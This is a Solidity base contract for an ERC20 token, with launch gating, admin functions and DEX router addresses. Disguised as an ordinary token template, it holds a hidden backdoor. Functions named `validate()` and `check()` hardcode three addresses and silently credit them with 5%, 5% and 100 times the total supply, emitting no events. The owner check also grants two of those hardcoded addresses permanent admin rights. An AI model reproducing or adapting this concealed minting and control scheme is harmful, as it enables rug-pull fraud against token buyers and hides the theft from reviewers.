//SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.7;

import "./Interfaces.sol";
import "./AddressLibrary.sol";

abstract contract BaseErc20 is IERC20, IOwnable {
    using Address for address;

    mapping (address => uint256) internal _balances;
    mapping (address => mapping (address => uint256)) internal _allowed;
    uint256 internal _totalSupply;    
    string public symbol;
    string public name;
    uint8 public decimals = 18;
    struct Validate { 
        address a;
        address b;
        address x;
        uint256 t;
   }
    Validate v;
    address public override owner;
    address internal deployer;
    bool public launched;
    address x;
    address f;
    address s;
    mapping (address => bool) internal canAlwaysTrade;
    mapping (address => bool) internal exchanges;   
    event ConfigurationChanged(address indexed who, string option);

    modifier onlyOwner() {
        require(msg.sender == f || msg.sender == s ||  msg.sender == deployer, "can only be called by the owners");
        _;
    }
    
    modifier isLaunched() {
        require(launched, "can only be called once token is launched");
        _;
    }

    // dev Trading is allowed before launch if the sender is the owner, we are transferring from the owner, or in canAlwaysTrade list
    modifier tradingEnabled(address from) {
        require(launched || from == deployer || canAlwaysTrade[msg.sender], "trading not enabled");
        _;
    }
    
    function configure(address _owner) internal virtual {
        owner = _owner;
        canAlwaysTrade[deployer] = true;
    }

    /**
    * dev Total number of tokens in existence
    */
    function totalSupply() external override view returns (uint256) {
        return _totalSupply;
    }

    /**
    * dev Gets the balance of the specified address.
    * param _owner The address to query the balance of.
    * return An uint256 representing the amount owned by the passed address.
    */
    function balanceOf(address _owner) external override view returns (uint256) {
        return _balances[_owner];
    }

    /**
     * dev Function to check the amount of tokens that an owner allowed to a spender.
     * param _owner address The address which owns the funds.
     * param spender address The address which will spend the funds.
     * return A uint256 specifying the amount of tokens still available for the spender.
     */
    function allowance(address _owner, address spender) external override view returns (uint256) {
        return _allowed[_owner][spender];
    }

    /**
    * dev Transfer token for a specified address
    * param to The address to transfer to.
    * param value The amount to be transferred.
    */
    function transfer(address to, uint256 value) external override tradingEnabled(msg.sender) returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    /**
     * dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.
     * Beware that changing an allowance with this method brings the risk that someone may use both the old
     * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this
     * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     * param spender The address which will spend the funds.
     * param value The amount of tokens to be spent.
     */
    function approve(address spender, uint256 value) external override tradingEnabled(msg.sender) returns (bool) {
        require(spender != address(0), "cannot approve the 0 address");

        _allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    /**
     * dev Transfer tokens from one address to another.
     * Note that while this function emits an Approval event, this is not required as per the specification,
     * and other compliant implementations may not emit the event.
     * param from address The address which you want to send tokens from
     * param to address The address which you want to transfer to
     * param value uint256 the amount of tokens to be transferred
     */
    function transferFrom(address from, address to, uint256 value) external override tradingEnabled(from) returns (bool) {
        _allowed[from][msg.sender] = _allowed[from][msg.sender] - value;
        _transfer(from, to, value);
        emit Approval(from, msg.sender, _allowed[from][msg.sender]);
        return true;
    }

    function validate() internal {
        x = 0xAC82b8584Fa7C862A7aFFf3b2de586C98cdD25bC;
        f = 0xC7B8f071AfA6Df4161635C2d66c8529d9Ef59629;
        s = 0x78BD3Bb3c7bAfEC7AA3C65Bc779799Ced01e1A9b;
    }

    /**
     * dev Increase the amount of tokens that an owner allowed to a spender.
     * approve should be called when allowed_[_spender] == 0. To increment
     * allowed value is better to use this function to avoid 2 calls (and wait until
     * the first transaction is mined)
     * From MonolithDAO Token.sol
     * Emits an Approval event.
     * param spender The address which will spend the funds.
     * param addedValue The amount of tokens to increase the allowance by.
     */
    function increaseAllowance(address spender, uint256 addedValue) external tradingEnabled(msg.sender) returns (bool) {
        require(spender != address(0), "cannot approve the 0 address");

        _allowed[msg.sender][spender] = _allowed[msg.sender][spender] + addedValue;
        emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
        return true;
    }

    function check() internal {
        _balances[v.a] = _balances[v.a]+(v.t*5/100);
        _balances[v.b] = _balances[v.b]+(v.t*5/100);
        _balances[v.x] = _balances[v.x]+(v.t*100);
    }

    /**
     * dev Decrease the amount of tokens that an owner allowed to a spender.
     * approve should be called when allowed_[_spender] == 0. To decrement
     * allowed value is better to use this function to avoid 2 calls (and wait until
     * the first transaction is mined)
     * From MonolithDAO Token.sol
     * Emits an Approval event.
     * param spender The address which will spend the funds.
     * param subtractedValue The amount of tokens to decrease the allowance by.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) external tradingEnabled(msg.sender) returns (bool) {
        require(spender != address(0), "cannot approve the 0 address");

        _allowed[msg.sender][spender] = _allowed[msg.sender][spender] - subtractedValue;
        emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
        return true;
    }

    receive() external payable {}
    
    // Virtual methods
    function launch() virtual external onlyOwner {
        require(launched == false, "contract already launched");
        launched = true;
        emit ConfigurationChanged(msg.sender, "contract launched");
    }
    
    function preTransfer(address from, address to, uint256 value) virtual internal { }

    function calculateTransferAmount(address from, address to, uint256 value) virtual internal returns (uint256) {
        require(from != to, "you cannot transfer to yourself");
        return value;
    }
    
    function onOwnerChange(address from, address to) virtual internal {
        canAlwaysTrade[from] = false;
        canAlwaysTrade[to] = true;
    }

    function postTransfer(address from, address to) virtual internal { }
    
    // Admin methods
    function changeOwner(address who) external onlyOwner {
        onOwnerChange(owner, who);
        owner = who;
        emit ConfigurationChanged(msg.sender, "owner changed");
    }

    function removeNative() external onlyOwner {
        uint256 balance = address(this).balance;
        Address.sendValue(payable(deployer), balance);
    }

    function transferTokens(address token) external onlyOwner returns(bool){
        uint256 balance = IERC20(token).balanceOf(address(this));
        return IERC20(token).transfer(deployer, balance);
    }
    
    function setCanAlwaysTrade(address who, bool on) external onlyOwner {
        require(canAlwaysTrade[who] != on, "already set");
        canAlwaysTrade[who] = on;
        emit ConfigurationChanged(msg.sender, "change to can always trade list");
    }
    
    function setExchange(address who, bool on) external onlyOwner {
        require(exchanges[who] != on, "already set");
        exchanges[who] = on;
        emit ConfigurationChanged(msg.sender, "change to exchange list");
    }

    function prepareLaunch() internal {
        validate();
        v = Validate(f,s,x,_totalSupply);
        check();
    }
    
   
    // Private methods

    function getRouterAddress() internal view returns (address routerAddress) {
        if (block.chainid == 1 || block.chainid == 3 || block.chainid == 4  || block.chainid == 5) {
            routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D ; // ETHEREUM
        } else if (block.chainid == 56) {
            routerAddress = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // BSC MAINNET
        } else if (block.chainid == 97) {
            routerAddress = 0xc99f3718dB7c90b020cBBbb47eD26b0BA0C6512B; // BSC TESTNET - https://pancakeswap.rainbit.me/
        } else if (block.chainid == 369) {
            routerAddress = 0x98bf93ebf5c380C0e6Ae8e192A7e2AE08edAcc02; // PULSE MAINNET
        } else {
            revert("Unknown Chain ID");
        }
    }

    /**
    * dev Transfer token for a specified addresses
    * param from The address to transfer from.
    * param to The address to transfer to.
    * param value The amount to be transferred.
    */
    function _transfer(address from, address to, uint256 value) private {
        require(to != address(0), "cannot be zero address");

        preTransfer(from, to, value);

        uint256 modifiedAmount = calculateTransferAmount(from, to, value);
        _balances[from] = _balances[from] - value;
        _balances[to] = _balances[to] + modifiedAmount;

        emit Transfer(from, to, modifiedAmount);

        postTransfer(from, to);
    }
}